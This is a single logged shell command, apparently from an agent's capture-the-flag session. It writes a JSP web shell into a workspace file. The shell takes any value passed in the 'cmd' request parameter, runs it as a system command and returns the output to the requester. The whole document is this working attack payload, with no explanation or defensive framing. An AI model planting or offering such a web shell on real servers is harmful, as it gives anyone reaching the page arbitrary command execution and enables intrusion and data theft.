commands.command:
cat <<'EOF' >/ctf-workspace/shell.jsp
<%@ page import="java.util.*,java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStream in = p.getInputStream();
        int ch;
        while ((ch = in.read()) != -1) {
            out.print((char) ch);
        }
    }
%>
EOF
